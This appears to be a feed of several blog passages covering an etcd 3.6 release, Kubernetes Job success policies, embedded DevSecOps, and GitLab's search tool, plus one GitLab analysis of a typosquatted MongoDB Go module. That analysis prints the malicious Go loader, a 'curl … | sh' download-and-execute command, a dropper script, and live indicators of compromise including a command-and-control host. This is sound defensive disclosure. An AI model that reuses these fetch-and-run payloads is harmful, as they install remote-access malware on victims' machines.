the data is expected to be persisted. However, the data might\nbe lost if etcd crashes immediately after sending the success response to the client. This was a legacy issue (see <a href=\"https://github.com/etcd-io/etcd/issues/14370\">issue/14370</a>)\naffecting all previous releases. It was addressed in v3.4.21 and v3.5.5 with <a href=\"https://github.com/etcd-io/etcd/pull/14400\">PR/14400</a>, and fixed in raft side in\nmain branch (now release-3.6) with <a href=\"https://github.com/etcd-io/etcd/pull/14413\">PR/14413</a>.</p>\n<ul>\n<li>Revision Inconsistency when Crashing During Defragmentation</li>\n</ul>\n<p>If etcd crashed during the defragmentation operation, upon restart, it might reapply\nsome entries which had already been applied, accordingly leading to the revision inconsistency issue\n(see the discussions in <a href=\"https://github.com/etcd-io/etcd/pull/14685\">PR/14685</a>). The issue was introduced in v3.5.0, and fixed in v3.5.6 with <a href=\"https://github.com/etcd-io/etcd/pull/14730\">PR/14730</a>.</p>\n<h2 id=\"upgrade-issue\">Upgrade issue</h2>\n<p>This section highlights a common issue <a href=\"https://github.com/etcd-io/etcd/issues/19557\">issues/19557</a> in the etcd v3.5 to v3.6 upgrade that may cause the upgrade\nprocess to fail. For a complete upgrade guide, refer to <a href=\"https://etcd.io/docs/v3.6/upgrades/upgrade_3_6/\">Upgrade etcd from v3.5 to v3.6</a>.</p>\n<p>The issue was introduced in etcd v3.5.1, and resolved in v3.5.20.</p>\n<p><strong>Key takeaway</strong>: users are required to first upgrade to etcd v3.5.20 (or a higher patch version) before upgrading\nto etcd v3.6.0; otherwise, the upgrade may fail.</p>\n<p>For more background and technical context, see <a href=\"https://etcd.io/blog/2025/upgrade_from_3.5_to_3.6_issue/\">upgrade_from_3.5_to_3.6_issue</a>.</p>\n<h2 id=\"testing\">Testing</h2>\n<p>We introduced the <a href=\"https://github.com/etcd-io/etcd/tree/main/tests/robustness\">Robustness testing</a> to verify correctness, which has always been our top priority.\nIt plays traffic of various types and volumes against an etcd cluster, concurrently injects a random\nfailpoint, records all operations (including both requests and responses), and finally performs a\nlinearizability check. It also verifies that the <a href=\"https://etcd.io/docs/v3.5/learning/api_guarantees/#watch-apis\">Watch APIs</a> guarantees have not been violated.\nThe robustness test increases our confidence in ensuring the quality of each etcd release.</p>\n<p>We have migrated most of the etcd workflow tests to Kubernetes' Prow testing infrastructure to\ntake advantage of its benefit, such as nice dashboards for viewing test results and the ability\nfor contributors to rerun failed tests themselves.</p>\n<h2 id=\"platforms\">Platforms</h2>\n<p>While retaining all existing supported platforms, we have promoted Linux/ARM64 to Tier 1 support.\nFor more details, please refer to <a href=\"https://github.com/etcd-io/etcd/issues/15951\">issues/15951</a>. For the complete list of supported platforms,\nsee <a href=\"https://etcd.io/docs/v3.6/op-guide/supported-platform/\">supported-platform</a>.</p>\n<h2 id=\"dependencies\">Dependencies</h2>\n<h3 id=\"dependency-bumping-guide\">Dependency bumping guide</h3>\n<p>We have published an official guide on how to bump dependencies for etcd’s main branch and stable releases.\nIt also covers how to update the Go version. For more details, please refer to <a href=\"https://github.com/etcd-io/etcd/blob/main/Documentation/contributor-guide/dependency_management.md\">dependency_management</a>.\nWith this guide available, any contributors can now help with dependency upgrades.</p>\n<h3 id=\"core-dependency-updates\">Core Dependency Updates</h3>\n<p><a href=\"https://github.com/etcd-io/bbolt\">bbolt</a> and <a href=\"https://github.com/etcd-io/raft\">raft</a> are two core dependencies of etcd.</p>\n<p>Both etcd v3.4 and v3.5 depend on bbolt v1.3, while etcd v3.6 depends on bbolt v1.4.</p>\n<p>For the release-3.4 and release-3.5 branches, raft is included in the etcd repository itself, so etcd v3.4 and v3.5\ndo not depend on an external raft module. Starting from etcd v3.6, raft was moved to a separate repository (<a href=\"https://github.com/etcd-io/raft\">raft</a>),\nand the first standalone raft release is v3.6.0. As a result, etcd v3.6.0 depends on raft v3.6.0.</p>\n<p>Please see the table below for a summary:</p>\n<table>\n<thead>\n<tr>\n<th>etcd versions</th>\n<th>bbolt versions</th>\n<th>raft versions</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3.4.x</td>\n<td>v1.3.x</td>\n<td>N/A</td>\n</tr>\n<tr>\n<td>3.5.x</td>\n<td>v1.3.x</td>\n<td>N/A</td>\n</tr>\n<tr>\n<td>3.6.x</td>\n<td>v1.4.x</td>\n<td>v3.6.x</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"grpc-gateway-v2\">grpc-gateway@v2</h3>\n<p>We upgraded <a href=\"https://github.com/grpc-ecosystem/grpc-gateway\">grpc-gateway</a> from v1 to v2 via <a href=\"https://github.com/etcd-io/etcd/pull/16595\">PR/16595</a> in etcd v3.6.0. This is a major step toward\nmigrating to <a href=\"https://github.com/protocolbuffers/protobuf-go\">protobuf-go</a>, the second major version of the Go protocol buffer API implementation.</p>\n<p>grpc-gateway@v2 is designed to work with <a href=\"https://github.com/protocolbuffers/protobuf-go\">protobuf-go</a>. However, etcd v3.6 still depends on the deprecated\n<a href=\"https://github.com/gogo/protobuf\">gogo/protobuf</a>, which is actually protocol buffer v1 implementation. To resolve this incompatibility,\nwe applied a <a href=\"https://github.com/etcd-io/etcd/blob/158b9e0d468d310c3edf4cf13f2458c51b0406fa/scripts/genproto.sh#L151-L184\">patch</a> to the generated *.pb.gw.go files to convert v1 messages to v2 messages.</p>\n<h3 id=\"grpc-ecosystem-go-grpc-middleware-providers-prometheus\">grpc-ecosystem/go-grpc-middleware/providers/prometheus</h3>\n<p>We switched from the deprecated (and archived) <a href=\"https://github.com/grpc-ecosystem/go-grpc-prometheus\">grpc-ecosystem/go-grpc-prometheus</a> to\n<a href=\"https://github.com/grpc-ecosystem/go-grpc-middleware/tree/main/providers/prometheus\">grpc-ecosystem/go-grpc-middleware/providers/prometheus</a> via <a href=\"https://github.com/etcd-io/etcd/pull/19195\">PR/19195</a>. This change ensures continued\nsupport and access to the latest features and improvements in the gRPC Prometheus integration.</p>\n<h2 id=\"community\">Community</h2>\n<p>There are exciting developments in the etcd community that reflect our ongoing commitment\nto strengthening collaboration, improving maintainability, and evolving the project’s governance.</p>\n<h3 id=\"etcd-becomes-a-kubernetes-sig\">etcd Becomes a Kubernetes SIG</h3>\n<p>etcd has officially become a Kubernetes Special Interest Group: SIG-etcd. This change reflects\netcd’s critical role as the primary datastore for Kubernetes and establishes a more structured\nand transparent home for long-term stewardship and cross-project collaboration. The new SIG\ndesignation will help streamline decision-making, align roadmaps with Kubernetes needs,\nand attract broader community involvement.</p>\n<h3 id=\"new-contributors-maintainers-and-reviewers\">New contributors, maintainers, and reviewers</h3>\n<p>We’ve seen increasing engagement from contributors, which has resulted in the addition of three new maintainers:</p>\n<ul>\n<li><a href=\"https://github.com/fuweid\">fuweid</a></li>\n<li><a href=\"https://github.com/jmhbnz\">jmhbnz</a></li>\n<li><a href=\"https://github.com/wenjiaswe\">wenjiaswe</a></li>\n</ul>\n<p>Their continued contributions have been instrumental in driving the project forward.</p>\n<p>We also welcome two new reviewers to the project:</p>\n<ul>\n<li><a href=\"https://github.com/ivanvc\">ivanvc</a></li>\n<li><a href=\"https://github.com/siyuanfoundation\">siyuanfoundation</a></li>\n</ul>\n<p>We appreciate their dedication to code quality and their willingness to take on broader review responsibilities\nwithin the community.</p>\n<p>New release team</p>\n<p>We've formed a new release team led by <a href=\"https://github.com/ivanvc\">ivanvc</a> and <a href=\"https://github.com/jmhbnz\">jmhbnz</a>, streamlining the release process by automating\nmany previously manual steps. Inspired by Kubernetes SIG Release, we've adopted several best practices, including\nclearly defined release team roles and the introduction of release shadows to support knowledge sharing and team\nsustainability. These changes have made our releases smoother and more reliable, allowing us to approach each\nrelease with greater confidence and consistency.</p>\n<h3 id=\"introducing-the-etcd-operator-working-group\">Introducing the etcd Operator Working Group</h3>\n<p>To further advance etcd’s operational excellence, we have formed a new working group: <a href=\"https://github.com/kubernetes/community/tree/master/wg-etcd-operator\">WG-etcd-operator</a>.\nThe working group is dedicated to enabling the automatic and efficient operation of etcd clusters that run in\nthe Kubernetes environment using an etcd-operator.</p>\n<h2 id=\"future-development\">Future Development</h2>\n<p>The legacy v2store has been deprecated since etcd v3.4, and the flag <code>--enable-v2</code> was removed entirely in v3.6.\nThis means that starting from v3.6, there is no longer a way to enable or use the v2store. However, etcd still\nbootstraps internally from the legacy v2 snapshots. To address this inconsistency, We plan to change etcd to\nbootstrap from the v3store and replay the WAL entries based on the <code>consistent-index</code>. The work is being tracked\nin <a href=\"https://github.com/etcd-io/etcd/issues/12913\">issues/12913</a>.</p>\n<p>One of the most persistent challenges remains the large range of queries from the kube-apiserver, which can\nlead to process crashes due to their unpredictable nature. The range stream feature, originally outlined in\nthe <a href=\"https://etcd.io/blog/2021/announcing-etcd-3.5/#future-roadmaps\">v3.5 release blog/Future roadmaps</a>, remains an idea worth revisiting to address the challenges of large\nrange queries.</p>\n<p>For more details and upcoming plans, please refer to the <a href=\"https://github.com/etcd-io/etcd/blob/main/Documentation/contributor-guide/roadmap.md\">etcd roadmap</a>.</p>",

Unfortunately, a leader-follower Kubernetes Job that didn't use a success policy, in most cases, would have to require <strong>all</strong> Pods to finish successfully\nfor that Job to reach an overall succeeded state.</p>\n<p>For Kubernetes Jobs, the API allows you to specify the early exit criteria using the <code>.spec.successPolicy</code>\nfield (you can only use the <code>.spec.successPolicy</code> field for an <a href=\"https://kubernetes.io/docs/concept/workloads/controllers/job/#completion-mode\">indexed Job</a>).\nWhich describes a set of rules either using a list of succeeded indexes for a job, or defining a minimal required size of succeeded indexes.</p>\n<p>This newly stable field is especially valuable for scientific simulation, AI/ML and High-Performance Computing (HPC) batch workloads.\nUsers in these areas often run numerous experiments and may only need a specific number to complete successfully, rather than requiring all of them to succeed.\nIn this case, the leader index failure is the only relevant Job exit criteria, and the outcomes for individual follower Pods are handled\nonly indirectly via the status of the leader index.\nMoreover, followers do not know when they can terminate themselves.</p>\n<p>After Job meets any <strong>Success Policy</strong>, the Job is marked as succeeded, and all Pods are terminated including the running ones.</p>\n<h2 id=\"how-it-works\">How it works</h2>\n<p>The following excerpt from a Job manifest, using <code>.successPolicy.rules[0].succeededCount</code>, shows an example of\nusing a custom success policy:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000;

      "published": "2025-07-01T00:00:00.000Z",
      "summary": "<p>For embedded systems teams, DevSecOps has traditionally seemed like an approach better suited to SaaS applications than firmware development. But this is changing. Software is now a primary differentiator in hardware products. New market expectations demand modern development practices. In response, organizations are pursuing &quot;embedded DevSecOps.&quot;</p>\n<p>What is embedded DevSecOps? The application of collaborative engineering practices, integrated toolchains, and automation for building, testing, and securing software to embedded systems development. Embedded DevSecOps includes necessary adaptations for hardware integration.</p>\n<h2>Convergence of market forces</h2>\n<p>Three powerful market forces are converging to compel embedded teams to modernize their development practices.</p>\n<h3>1. The software-defined product revolution</h3>\n<p>Products once defined primarily by their hardware are now differentiated by their software capabilities. The software-defined vehicle (SDV) market tells a compelling story in this regard. It's projected to grow from $213.5 billion in 2024 to <a href=\"https://www.marketsandmarkets.com/Market-Reports/software-defined-vehicles-market-187205966.html\">$1.24 trillion</a> by 2030, a massive 34% compound annual growth rate.\nThe software content in these products is growing considerably. By the end of 2025, the average vehicle is expected to contain <a href=\"https://www.statista.com/statistics/1370978/automotive-software-average-lines-of-codes-per-vehicle-globally/\">650 million lines of code</a>. Traditional embedded development approaches cannot handle this level of software complexity.</p>\n<h3>2. Hardware virtualization as a technical enabler</h3>\n<p>Hardware virtualization is a key technical enabler of embedded DevSecOps. Virtual electronic control units (vECUs), cloud-based ARM CPUs, and sophisticated simulation environments are becoming more prevalent. Virtual hardware allows testing that once required physical hardware.</p>\n<p>These virtualization technologies provide a foundation for continuous integration (<a href=\"https://about.gitlab.com/topics/ci-cd/\">CI</a>). But their value is fully realized only when integrated into an automated workflow. Combined with collaborative development practices and automated pipelines, virtual testing helps teams detect issues much earlier, when fixes are far less expensive. Without embedded DevSecOps practices and tooling to orchestrate these virtual resources, organizations can't capitalize on the virtualization trend.</p>\n<h3>3. The competitive and economic reality</h3>\n<p>Three interrelated forces are reshaping the competitive landscape for embedded development:</p>\n<ul>\n<li>The talent war has shifted decisively. As an embedded systems leader at a GitLab customer explained, “No embedded engineers graduating from college today know legacy tools like Perforce. They know Git. These young engineers will work at a company for six months on legacy tools, then quit.” Companies using outdated tools may lose their engineering future.</li>\n<li>This talent advantage translates into competitive superiority. Tech-forward companies that attract top engineers with modern practices achieve remarkable results. For example, in 2024, <a href=\"https://spacenews.com/spacex-launch-surge-helps-set-new-global-launch-record-in-2024/\">SpaceX</a> performed more orbital launches than the rest of the world combined. Tech-forward companies excel at software development and embrace a modern development culture. This, among other things, creates efficiencies that legacy companies struggle to match.</li>\n<li>The rising costs of embedded development — driven by long feedback cycles — create an urgent need for embedded DevSecOps. When developers have to wait weeks to test code on hardware test benches, productivity remains inherently low. Engineers lose context and must switch contexts when results arrive. The problem worsens when defects enter the picture. Bugs become more expensive to fix the later they're discovered. Long feedback cycles magnify this problem in embedded systems.</li>\n</ul>\n<p>Organizations are adopting embedded DevSecOps to help combat these challenges.</p>\n<h2>Priority transformation areas</h2>\n<p>Based on these market forces, forward-thinking embedded systems leaders are implementing embedded DevSecOps in the following ways.</p>\n<h3>From hardware bottlenecks to continuous testing</h3>\n<p>Hardware-testing bottlenecks represent one of the most significant constraints in traditional embedded development. These delays create the unfavorable economics described earlier — when developers wait weeks for hardware access, defect costs spiral.\nAddressing this challenge requires a multifaceted approach including:</p>\n<ul>\n<li>Automating the orchestration of expensive shared hardware test benches among embedded developers</li>\n<li>Integrating both SIL (Software-in-the-Loop) and HIL (Hardware-in-the-Loop) testing into automated CI pipelines</li>\n<li>Standardizing builds with version-controlled environments</li>\n</ul>\n<p>Embedded developers can accomplish this with GitLab's <a href=\"https://gitlab.com/gitlab-accelerates-embedded/comp/device-cloud\">On-Premises Device Cloud</a>, a CI/CD component. Through automating the orchestration of firmware tests on virtual and real hardware, teams are better positioned to reduce feedback cycles from weeks to hours. They also can catch more bugs early on in the software development lifecycle.</p>\n<h3>Automating compliance and security governance</h3>\n<p>Embedded systems face strict regulatory requirements. Manual compliance processes are unsustainable.\nLeading organizations are transforming how they comply with these requirements by:</p>\n<ul>\n<li>Replacing manual workflows with automated <a href=\"https://about.gitlab.com/blog/introducing-custom-compliance-frameworks-in-gitlab/\">compliance frameworks</a></li>\n<li>Integrating specialized functional safety, security, and code quality tools into automated continuous integration pipelines</li>\n<li>Automating approval workflows, enforcing code reviews, and maintaining audit trails</li>\n<li>Configuring compliance frameworks for specific standards like ISO 26262 or DO-178C</li>\n</ul>\n<p>This approach enables greater compliance maturity without additional headcount — turning what was once a burden into a competitive advantage. One leading electric vehicle (EV) manufacturer executes 120,000 CI/CD jobs per day with GitLab, many of which include compliance checks. And they can fix and deploy bug fixes to vehicles within an hour of discovery. This level of scale and speed would be extremely difficult without automated compliance workflows.</p>\n<h3>Enabling collaborative innovation</h3>\n<p>Historically, for valid business and technical reasons, embedded developers have largely worked alone at their desks. Collaboration has been limited. Innovative organizations break down these barriers by enabling shared code visibility through integrated source control and CI/CD workflows. These modern practices attract and retain engineers while unlocking innovation that would remain hidden in isolated workflows.\nAs one director of DevOps at a tech-forward automotive manufacturer (a GitLab customer) explains: &quot;It's really critical for us to have a single pane of glass that we can look at and see the statuses. The developers, when they bring a merge request, are aware of the status of a given workflow in order to move as fast as possible.&quot; This transparency accelerates innovation, enabling automakers to rapidly iterate on software features that differentiate their vehicles in an increasingly competitive market.</p>\n<h2>The window of opportunity</h2>\n<p>Embedded systems leaders have a clear window of opportunity to gain a competitive advantage through DevSecOps adoption. But the window won't stay open forever. Software continues to become the primary differentiator in embedded products, and the gap between leaders and laggards will only widen.\nOrganizations that successfully adopt DevSecOps will reduce costs, accelerate time-to-market, and unlock innovation that differentiates them in the market. The embedded systems leaders of tomorrow are the ones embracing DevSecOps today.</p>\n<blockquote>\n<p>While this article explored why now is the critical time for embedded teams to adopt DevSecOps, you may be wondering about the practical steps to get started.

      "published": "2025-06-30T00:00:00.000Z",
      "summary": "<p>Software supply chain attacks via malicious dependencies continue to be one of the most significant security threats to modern software development. The widespread use of open source components has enabled development teams to build applications rapidly, but it has also widened the attack surface area. The growing ecosystem of third-party packages presents numerous opportunities for attackers to exploit dependencies through techniques like typosquatting, dependency confusion, and package impersonation, making it increasingly challenging for developers to distinguish legitimate packages from malicious imposters.</p>\n<p>To address this challenge, GitLab's Vulnerability Research team recently developed an automated detection system designed to proactively identify malicious dependencies in software supply chains. The system combines multiple detection techniques that work in concert:</p>\n<ul>\n<li>Automated typosquatting detection, which identifies suspicious naming patterns</li>\n<li>Semantic code analysis, which flags potentially malicious behaviors like network requests or command executions</li>\n<li>AI-assisted initial screening for advanced payload and obfuscation detection</li>\n</ul>\n<p>This multi-layered approach is used by the vulnerability research team to continuously scan newly published dependencies across major ecosystems, providing early warning of supply chain attacks.</p>\n<p>Using this detection system, GitLab recently identified a live typosquatting attack in the wild that leveraged a malicious MongoDB Go module. Below are details on the attack and how GitLab works to keep supply chains safe.</p>\n<h2>Executive summary: A MongoDB module that's not quite right</h2>\n<p>Our detection system flagged a newly published Go module called <code>github.com/qiniiu/qmgo</code>, closely mimicking the popular <a href=\"https://www.mongodb.com/\">MongoDB</a> module <code>github.com/qiniu/qmgo</code>. The legitimate module describes itself as &quot;The Go driver for MongoDB&quot; and has gained traction in the Go community.</p>\n<p>To disguise the malicious module as legitimate, the threat actor used a GitHub username nearly identical to the one associated with the real module with one subtle change: they added one “i” (<code>qiniu</code> → <code>qiniiu</code>). To the casual observer scrolling through search results or auto-complete suggestions, this difference would be very easy to overlook.</p>\n<p>The new module’s code was a working copy of the legitimate <code>qmgo</code> module. However, malicious code was inserted into the <code>NewClient</code> function in <code>client.go</code>, a function that developers would naturally call when initializing their MongoDB connection. Concealing malicious code within a function made the payload less likely to be executed during potential runtime security analysis, while ensuring that it would execute from normal usage in real applications.</p>\n<p>After reporting the malicious module, it was removed within approximately 19 hours of our initial report. However, the threat actor quickly adapted, publishing a second typosquatted version (<code>github.com/qiiniu/qmgo</code>) just four days later with identical malicious code. This follow-up attack was also detected and taken down roughly one hour after initial discovery. The rapid redeployment demonstrates the persistent nature of these attacks and highlights why proactive detection is crucial in minimizing exposure windows.</p>\n<h2>Technical deep dive: Peeling back the layers</h2>\n<p>The threat actor took steps to hide the attack. The malicious payload used a multilayered approach, starting with a compact code snippet that triggered a chain of remote payload downloads:</p>\n<pre><code class=\"language-go\">txt, err := script.Get(&quot;https://raw.githubusercontent.com/qiiniu/vue-element-admin/refs/heads/main/public/update.html&quot;).String()  \nif err == nil {  \n    txt2, err := script.Get(string(strings.Replace(txt, &quot;\\n&quot;, &quot;&quot;, -1))).String()  \n    if err == nil {  \n        exec.Command(&quot;/bin/sh&quot;, &quot;-c&quot;, string(txt2)).Start()  \n    }  \n}  \n</code></pre>\n<p>The attack unfolds in four distinct layers:</p>\n<p><strong>Layer 1:</strong> The code fetches <code>update.html</code> from another repository owned by the typosquat account <code>qiiniu/vue-element-admin</code>. The file contained a single line:</p>\n<pre><code>https://img.googlex.cloud/seed.php\n</code></pre>\n<p><strong>Layer 2:</strong> The code then fetches <code>https://img.googlex.cloud/seed.php</code>, which returns a single shell command, which is executed:</p>\n<pre><code class=\"language-bash\">curl -s http://207.148.110.29:80/logon61.gif|sh\n</code></pre>\n<p><strong>Layer 3:</strong> The command tells the system to fetch <code>http://207.148.110.29:80/logon61.gif</code> using curl and execute the response as a shell script.  The shell script downloads what appears to be an MP3 file (<code>chainelli.mp3</code>) to <code>/tmp/vod</code>, makes it executable, runs it, and immediately deletes it:</p>\n<pre><code class=\"language-bash\">#!/bin/sh  \nrm -rf /tmp/vod  \ncurl -s http://207.148.110.29:80/chainelli.mp3 -o /tmp/vod  \nchmod 777 /tmp/vod  \n/tmp/vod  \nrm -rf /tmp/vod  \n</code></pre>\n<p><strong>Layer 4:</strong> The <code>chainelli.mp3</code> file is actually a statically-linked, stripped ELF Go binary designed to establish persistent remote access. Once executed, the malware attempts to connect to its command and control server at <code>ellipal.spoolsv.cyou</code> on Port 443 (both TCP and UDP), using a custom encrypted communication protocol with a hardcoded RSA key. From there, it provides the threat actor with remote administration capabilities:</p>\n<ul>\n<li>Complete remote shell access and one-off command execution</li>\n<li>Screenshot captures</li>\n<li>SOCKS proxy functionality to make connections through the compromised machine</li>\n<li>Configurable sleep interval between check-ins with the command and control server to avoid detection</li>\n<li>Standard remote access trojan features like filesystem browsing and upload/download</li>\n</ul>\n<h2>They're back (already)</h2>\n<p>Just four days after GitLab reported the initial malicious module and saw it removed, <code>github.com/qiiniu/qmgo</code> appeared – the second typosquatted version with identical malicious code. This quick redeployment demonstrates the persistent nature of these attacks and highlights how threat actors adapt quickly to takedown efforts.</p>\n<h2>GitLab’s approach: Finding needles in haystacks</h2>\n<p>The initial discovery and persistence of this attack validated our approach to proactive dependency monitoring and threat detection. GitLab’s detection system combines multiple techniques to identify malicious dependencies:</p>\n<p><strong>Typosquatting detection:</strong> GitLab monitors newly published dependencies and looks for packages that exhibit signs of various typosquatting strategies.</p>\n<p><strong>Semantic heuristics:</strong> Our system statically analyzes code for patterns like network requests, command executions, and other behaviors typical of malicious payloads.</p>\n<p><strong>AI-assisted analysis:</strong> A <a href=\"https://about.gitlab.com/blog/what-is-a-large-language-model-llm/\">large language model</a> does the initial analysis of the suspicious parts of the code to help us weed out obvious false positives, detect complex payloads, and identify obfuscation techniques used to hide malicious intent.</p>\n<p><strong>Human review:</strong> A human receives an alert to verify the finding and to perform advanced analysis.</p>\n<h2>Recommendations: Staying ahead of persistent supply chain threats</h2>\n<p>This attack highlights the ongoing challenges in securing software supply chains. The multilayered obfuscation and rapid redeployment after takedown demonstrate that threat actors are willing to invest significant effort in targeting popular dependencies.</p>\n<p>The quick pivot to new typosquatted packages after our initial report highlights a fundamental weakness in the current ecosystems: package managers typically only remove malicious dependencies after they've been published, discovered, and reported by the community. This reactive approach leaves a dangerous window where developers can unknowingly consume compromised packages. Proactive monitoring and detection systems like the one GitLab has developed can help close this gap by identifying threats during the publication process itself.</p>\n<p>We've provided indicators of compromise (IOCs) in the next section, which you can use in your monitoring systems to detect this specific campaign.</p>\n<h2>Indicators of compromise</h2>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">IOC</th>\n<th style=\"text-align: left;\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\"><code>github.com/qiniiu/qmgo</code></td>\n<td style=\"text-align: left;\">Malicious Go module</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>github.com/qiiniu/qmgo</code></td>\n<td style=\"text-align: left;\">Malicious Go module</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>https://raw.githubusercontent.com/qiniiu/vue-element-admin/refs/heads/main/public/update.html</code></td>\n<td style=\"text-align: left;\">Payload delivery URL</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>https://raw.githubusercontent.com/qiiniu/vue-element-admin/refs/heads/main/public/update.html</code></td>\n<td style=\"text-align: left;\">Payload delivery URL</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>https://img.googlex.cloud/seed.php</code></td>\n<td style=\"text-align: left;\">Payload delivery URL</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>http://207.148.110.29:80/logon61.gif</code></td>\n<td style=\"text-align: left;\">Payload delivery URL</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>http://207.148.110.29:80/chainelli.mp3</code></td>\n<td style=\"text-align: left;\">Payload delivery URL</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>img.googlex.cloud</code></td>\n<td style=\"text-align: left;\">Payload delivery host</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>207.148.110.29</code></td>\n<td style=\"text-align: left;\">Payload delivery host</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>ellipal.spoolsv.cyou</code></td>\n<td style=\"text-align: left;\">Command &amp; Control host</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>6ada952c592f286692c59028c5e0fc3fa589759f</code></td>\n<td style=\"text-align: left;\">SHA-1 checksum of chainelli.mp3 remote administration malware</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>8ae533e2d1d89c871908cbcf5c7d89c433d09b2e7f7d4ade3aef46c55b66509c</code></td>\n<td style=\"text-align: left;\">SHA-256 checksum of chainelli.mp3 remote administration malware</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>/tmp/vod</code></td>\n<td style=\"text-align: left;\">Temporary download location of chainelli.mp3 remote administration malware</td>\n</tr>\n</tbody>\n</table>\n<h2>How GitLab helps secure the software supply chain</h2>\n<p>Malicious dependencies, like the MongoDB Go module attack, highlight why securing the software supply chain requires more than just CVE monitoring.

After <a href=\"https://gitlab.com/groups/gitlab-org/-/epics/7404\">evaluating numerous options</a>, we developed a better solution.</p>\n<h2>Introducing Exact Code Search: Three game-changing capabilities</h2>\n<p>Enter GitLab's <strong><a href=\"https://docs.gitlab.com/ee/user/search/exact_code_search.html\">Exact Code Search</a></strong>, currently in beta testing and powered by <a href=\"https://github.com/sourcegraph/zoekt\">Zoekt</a> (pronounced &quot;zookt&quot;, Dutch for &quot;search&quot;). Zoekt is an open-source code search engine originally created by Google and now maintained by Sourcegraph, specifically designed for fast, accurate code search at scale. We've enhanced it with GitLab-specific integrations, enterprise-scale improvements, and seamless permission system integration.</p>\n<p>This feature revolutionizes how you find and understand code with three key capabilities:</p>\n<p><strong>1. Exact Match mode: Zero false positives</strong></p>\n<p>When toggled to <strong>Exact Match mode</strong>, the search engine returns only results that match your query exactly as entered, eliminating false positives. This precision is invaluable when:</p>\n<ul>\n<li>Searching for specific error messages</li>\n<li>Looking for particular function signatures</li>\n<li>Finding instances of specific variable names</li>\n</ul>\n<p><strong>2. Regular Expression mode: Powerful pattern matching</strong></p>\n<p>For complex search needs, Regular Expression mode allows you to craft sophisticated search patterns:</p>\n<ul>\n<li>Find functions following specific naming patterns</li>\n<li>Locate variables matching certain constraints</li>\n<li>Identify potential security vulnerabilities using pattern matching</li>\n</ul>\n<p><strong>3. Multiple-line matches: See code in context</strong></p>\n<p><img alt=\"Exact Code Search\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1750704179/ttjuilkt3v7gtyywnchx.png\" /></p>\n<p>Instead of seeing just a single line with your matching term, you get the surrounding context that's crucial for understanding the code. This eliminates the need to click through to files for basic comprehension, significantly accelerating your workflow.</p>\n<h2>From features to workflows: Real-world use cases and impact</h2>\n<p>Let's see how these capabilities translate to real productivity gains in everyday development scenarios:</p>\n<h3>Debugging: From error message to root cause in seconds</h3>\n<p>Before Exact Code Search:\nCopy an error message, search, wade through dozens of partial matches in comments and documentation, click through multiple files, and eventually find the actual code.</p>\n<p>With Exact Code Search:</p>\n<ol>\n<li>Copy the exact error message</li>\n<li>Paste it into Exact Code Search with Exact Match mode</li>\n<li>Instantly find the precise location where the error is thrown, with surrounding context</li>\n</ol>\n<p><strong>Impact:</strong> Reduce debugging time from minutes to seconds, eliminating the frustration of false positives.</p>\n<h3>Code exploration: Master unfamiliar codebases quickly</h3>\n<p>Before Exact Code Search:\nBrowse through directories, make educated guesses about file locations, open dozens of files, and slowly build a mental map of the codebase.</p>\n<p>With Exact Code Search:</p>\n<ul>\n<li>Search for key methods or classes with Exact Match mode</li>\n<li>Review multiple line matches to understand implementation details</li>\n<li>Use Regular Expression mode to find similar patterns across the codebase</li>\n</ul>\n<p><strong>Impact:</strong> Build a mental map of code structure in minutes rather than hours, dramatically accelerating onboarding and cross-team collaboration.</p>\n<h3>Refactoring with confidence</h3>\n<p>Before Exact Code Search:\nAttempt to find all instances of a method, miss some occurrences, and introduce bugs through incomplete refactoring.</p>\n<p>With Exact Code Search:</p>\n<ul>\n<li>Use Exact Match mode to find all occurrences of methods or variables</li>\n<li>Review context to understand usage patterns</li>\n<li>Plan your refactoring with complete information about impact</li>\n</ul>\n<p><strong>Impact:</strong> Eliminate the &quot;missed instance&quot; bugs that often plague refactoring efforts, improving code quality and reducing rework.</p>\n<h3>Security auditing: Finding vulnerable patterns</h3>\n<p>Security teams can:</p>\n<ul>\n<li>Create regex patterns matching known vulnerable code</li>\n<li>Search across all repositories in a namespace</li>\n<li>Quickly identify potential security issues with context that helps assess risk</li>\n</ul>\n<p><strong>Impact:</strong> Transform security audits from manual, error-prone processes to systematic, comprehensive reviews.</p>\n<h3>Cross-repository insights</h3>\n<p>Search across your entire namespace or instance to:</p>\n<ul>\n<li>Identify similar implementations across different projects</li>\n<li>Discover opportunities for shared libraries or standardization</li>\n</ul>\n<p><strong>Impact:</strong> Break down silos between projects and identify opportunities for code reuse and standardization.</p>\n<h2>The technical foundation: How Zoekt delivers speed and precision</h2>\n<p>Before diving into our scale achievements, let's explore what makes Zoekt fundamentally different from traditional search engines — and why it can find exact matches so incredibly fast.</p>\n<h3>Positional trigrams: The secret to lightning-fast exact matches</h3>\n<p>Zoekt's speed comes from its use of <strong>positional trigrams</strong> — a technique that indexes every sequence of three characters along with their exact positions in files. This approach solves one of the biggest pain points developers have had with Elasticsearch-based code search: false positives.</p>\n<p>Here's how it works:</p>\n<p><strong>Traditional full-text search engines</strong> like Elasticsearch tokenize code into words and lose positional information. When you search for <code>getUserId()</code>, they might return results containing <strong>user</strong>, <strong>get</strong>, and <strong>Id</strong> scattered throughout a file — leading to those frustrating false positives for GitLab users.</p>\n<p><strong>Zoekt's positional trigrams</strong> maintain exact character sequences and their positions. When you search for <code>getUserId()</code>, Zoekt looks for the exact trigrams like <strong>get</strong>, <strong>etU</strong>, 